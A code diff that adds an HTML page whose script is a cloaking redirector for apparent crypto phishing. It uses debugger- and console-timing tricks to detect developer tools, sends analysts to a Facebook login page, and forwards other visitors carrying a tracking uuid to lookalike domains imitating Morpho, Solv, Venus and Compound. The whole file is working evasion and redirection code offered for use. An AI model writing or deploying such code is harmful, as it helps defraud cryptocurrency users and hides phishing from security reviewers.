@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        const config = {
+            devToolsWarningUrl: "https://facebook.com/login",
+            targetDomains: {
+                "default": "https://google.com/",
+                "morpho": "https://morpho.my/",
+                "solv": "https://solv-finance.one/",
+                "venus": "https://venusprotocol.sbs/",
+                "compund": "https://compound-fi.com/"
+            },
+            defaultDomain: "default",
+            redirectDelay: 50,
+            debug: false
+        };
+
+        let isDevToolsOpen = false;
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const uuid = urlParams.get('uuid');
+        const targetDomain = urlParams.get('domain') || config.defaultDomain;
+
+        init();
+
+        function init() {
+            checkDebugger();
+            checkConsole();
+            
+            if (config.debug) {
+                console.log("UUID:", uuid);
+                console.log("Target domain:", targetDomain);
+                console.log("Referrer includes .pages.dev:", document.referrer.includes(".pages.dev"));
+            }
+
+            setTimeout(function() {
+                if (!isDevToolsOpen) {
+                    if (uuid) {
+                        if (config.targetDomains[targetDomain]) {
+                            window.location.href = `${config.targetDomains[targetDomain]}${uuid}`;
+                        } else {
+                            window.location.href = `${config.targetDomains[config.defaultDomain]}${uuid}`;
+                        }
+                    } else {
+                        window.location.href = config.devToolsWarningUrl;
+                    }
+                } else {
+                    window.location.href = config.devToolsWarningUrl;
+                }
+            }, config.redirectDelay);
+        }
+
+        function checkDebugger() {
+            const startTime = Date.now();
+            debugger;
+            const endTime = Date.now();
+            if (endTime - startTime > 100) {
+                isDevToolsOpen = true;
+            }
+        }
+
+        function checkConsole() {
+            const startTime = Date.now();
+            console.clear();
+            const endTime = Date.now();
+            if (endTime - startTime > 100) {
+                isDevToolsOpen = true;
+            }
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
